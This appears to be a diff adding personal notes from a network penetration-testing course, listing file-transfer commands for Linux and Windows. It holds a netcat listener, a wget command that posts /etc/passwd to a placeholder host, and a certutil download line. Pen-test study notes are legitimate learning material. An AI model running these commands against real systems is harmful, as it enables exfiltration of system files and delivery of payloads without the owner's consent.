@@ -1,0 +1,14 @@
+
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+#@  
+#@  COOL LINUX AND WINDOWS FILE COPY COMMANDS, FROM YOUTUBE NETWORK PEN TEST COURSE
+#@  
+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   2020-02-07[Feb-Fri]20-08PM 
+
+##FILE TRANSFERS
+##linux
+nc -nvlp 8081
+wget --post-file=/etc/passwd ip:port
+
+##windows
+certutil --urlcache -f https://url/file.txt filename.txt
